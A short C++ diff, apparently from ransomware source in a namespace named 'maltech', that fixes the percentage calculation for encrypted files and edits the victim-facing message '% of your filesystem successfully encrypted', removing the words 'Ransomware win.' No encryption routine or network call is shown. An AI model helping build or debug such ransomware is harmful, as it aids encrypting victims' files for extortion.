@@ -10,6 +10,8 @@
 
 #include <Windows.h>
 #include <utility>
+#include <iomanip>
+#include <sstream>
 
 
 namespace maltech {
@@ -40,12 +42,12 @@ namespace maltech {
                     }
                 }
             }
-            double crypted_persentege = crypted_count_ / files_count_ * 100;
+            double crypted_persentege = (crypted_count_.load() * 100.0 / files_count_.load());
             std::ostringstream strm;
             strm << std::setprecision(2)
                 << crypted_persentege
                 << "% of your filesystem "
-                "successfully encrypted. Ransomware win.";
+                "successfully encrypted.";
             MessageBoxA(NULL, strm.str().data(), "Result", MB_OK);
         }
 
